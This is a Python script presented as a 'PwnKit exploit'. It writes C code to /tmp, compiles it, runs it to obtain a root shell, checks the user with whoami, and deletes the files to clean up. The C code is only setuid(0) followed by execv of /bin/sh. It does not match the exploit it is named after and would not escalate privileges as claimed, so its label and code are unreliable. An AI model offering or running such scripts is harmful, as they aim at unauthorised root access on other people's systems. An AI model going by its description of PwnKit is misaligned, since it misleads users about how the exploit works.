import os
import subprocess

# C code for the PwnKit exploit
exploit_code = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0); // Obtain root privileges
    char *args[] = { "/bin/sh", NULL };
    execv("/bin/sh", args); // Spawn a shell
    return 0;
}
"""

# Save the C code to a temporary file
exploit_file_path = "/tmp/kit.c"
with open(exploit_file_path, 'w') as f:
    f.write(exploit_code)

# Compile the C code into an executable
compile_result = subprocess.run(["gcc", exploit_file_path, "-o", "/tmp/kit"], capture_output=True, text=True)
print("GCC Compilation Output:")
print(compile_result.stdout)
print("GCC Compilation Error:")
print(compile_result.stderr)

# Set permissions to make the file executable
os.chmod("/tmp/kit", 0o755)

# Execute the binary to obtain a root shell
root_shell = subprocess.Popen(["/tmp/kit"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

# Check if we have root privileges by running `whoami`
root_shell.stdin.write("whoami\n")
root_shell.stdin.flush()
output = root_shell.stdout.readline()
print("User after exploit execution:")
print(output.strip())

# Clean up source and executable files
os.remove("/tmp/kit.c")
os.remove("/tmp/kit")
